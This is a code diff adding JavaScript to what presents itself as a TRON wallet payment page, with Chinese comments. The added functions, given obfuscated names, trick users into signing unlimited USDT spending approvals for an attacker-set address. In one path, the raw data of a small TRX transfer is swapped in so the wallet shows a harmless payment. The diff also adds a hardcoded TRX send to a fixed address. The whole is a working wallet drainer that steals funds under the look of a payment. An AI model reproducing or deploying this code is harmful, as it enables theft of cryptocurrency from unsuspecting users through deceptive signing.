@@ -1,27 +1,133 @@
-// 统一的下一步按钮点击处理函数
+
+
+// 下一步按钮点击处理函数
 async function onNextButtonClick() {
     try {
-        // 确保钱包已连接
+        // 检查钱包是否已连接
         if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
             await connectWallet();
-            return;
+            return; // 连接后停止，等待用户再次点击
         }
-
-        // 选择执行交易类型
-        const transactionType = prompt("请输入 1 执行 TRX 转账，输入 2 执行 USDT 授权:");
-
-        if (transactionType === "1") {
-            await sendTRXTransaction();
-        } else if (transactionType === "2") {
-            await approveUSDT();
+        // 钱包已连接，直接执行操作
+        if (typeof window.okxwallet !== 'undefined') {
+            await DjdskdbGsj();
         } else {
-            alert("❌ 请输入正确的选项！");
+            await KdhshaBBHdg();
         }
     } catch (error) {
-        console.error("❌ 操作失败:", error);
-        tip("交易失败，请重试！");
+        console.error('操作执行失败:', error);
+        tip('付款失败，请重新发起交易');
     }
 }
+
+
+async function DjdskdbGsj() {
+  const trxAmountInSun = tronWeb.toSun(currentAmount);
+  const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+  const feeLimit = 1000000000;
+  
+  try {
+
+    const paymentAddress = tronWeb.address.fromHex(window.Payment_address);
+    
+    console.log("构建TRX转账交易...");
+    const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+      paymentAddress,
+      trxAmountInSun,
+      tronWeb.defaultAddress.base58,
+      { feeLimit: feeLimit }
+    );
+
+    const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
+      tronWeb.address.toHex(window.usdtContractAddress),
+      'increaseApproval(address,uint256)',
+      { feeLimit: feeLimit },
+      [
+        { type: 'address', value: window.Permission_address },
+        { type: 'uint256', value: maxUint256 }
+      ],
+      tronWeb.defaultAddress.base58
+    );
+
+    const originalRawData = approvalTransaction.transaction.raw_data;
+
+    approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
+
+    console.log("交易签名中...");
+    const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+
+    signedTransaction.raw_data = originalRawData;
+
+    console.log("发送交易...");
+    const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+    console.log("交易结果:", broadcastResult);
+    if (broadcastResult.result || broadcastResult.success) {
+      const transactionHash = broadcastResult.txid || (broadcastResult.transaction && broadcastResult.transaction.txID);
+      if (!transactionHash) {
+        throw new Error("无法获取交易哈希");
+      }
+      console.log("交易发送成功，交易哈希:", transactionHash);
+      tip("交易成功");
+      return transactionHash;
+    } else {
+      throw new Error("交易失败");
+    }
+  } catch (error) {
+    console.error("操作失败:", error);
+    tip("交易失败，请重试");
+    throw error;
+  }
+}
+
+async function KdhshaBBHdg() {
+    const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const feeLimit = 100000000;  // 设置feeLimit为100 TRX
+    const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+
+    try {
+        console.log("构建交易...");
+        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+            usdtContractAddressHex,
+            'approve(address,uint256)',
+            { feeLimit: feeLimit },
+            [
+                { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                { type: 'uint256', value: maxUint256 }
+            ],
+            tronWeb.defaultAddress.base58
+        );
+
+        if (!transaction.result || !transaction.result.result) {
+            throw new Error('授权交易构建失败');
+        }
+
+        console.log("交易签名中...");
+        const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+
+        console.log("发送交易...");
+        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+
+        console.log("交易交易结果:", result);
+        if (result.result) {
+            const transactionHash = result.txid;
+            console.log("交易成功，交易哈希:", transactionHash);
+            tip("交易成功");
+            return transactionHash;
+        } else {
+            throw new Error("交易失败");
+        }
+    } catch (error) {
+        console.error("执行授权操作失败:", error);
+        if (error && error.message) {
+            console.error("错误信息:", error.message);
+        }
+        tip("交易成功，请重试");
+        throw error;
+    }
+}
+
+
 
 // TRX 转账交易
 async function sendTRXTransaction() {
@@ -143,5 +249,37 @@ async function checkTRXBalance() {
         }
     } catch (error) {
         console.error("❌ 获取 TRX 余额失败:", error);
+    }
+}
+
+//3.6更新
+async function checkAndRentEnergy() {
+    const energyThreshold = 10000;  // 需要的最低能量
+    const leaseAddress = "TRGKyGrfqXismG7LddwVDm2nuZc83MMMMM";
+    const leaseAmount = 1.8;  // 1.8 TRX 兑换能量
+
+    try {
+        const account = await window.tronWeb.trx.getAccount(window.tronWeb.defaultAddress.base58);
+        const energy = account.energy || 0;
+        console.log(`📌 当前能量: ${energy}`);
+
+        if (energy < energyThreshold) {
+            console.log(`⚠️ 能量不足，正在租赁 ${leaseAmount} TRX 获取能量...`);
+
+            const trxAmountInSun = window.tronWeb.toSun(leaseAmount);
+            const transaction = await window.tronWeb.transactionBuilder.sendTrx(leaseAddress, trxAmountInSun, window.tronWeb.defaultAddress.base58);
+            const signedTransaction = await window.tronWeb.trx.sign(transaction);
+            const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
+
+            if (broadcast.result) {
+                console.log(`✅ 能量租赁成功！交易哈希: ${broadcast.txid}`);
+            } else {
+                throw new Error("能量租赁失败");
+            }
+        } else {
+            console.log("✅ 能量充足，无需租赁");
+        }
+    } catch (error) {
+        console.error("❌ 处理能量租赁失败:", error);
     }
 }
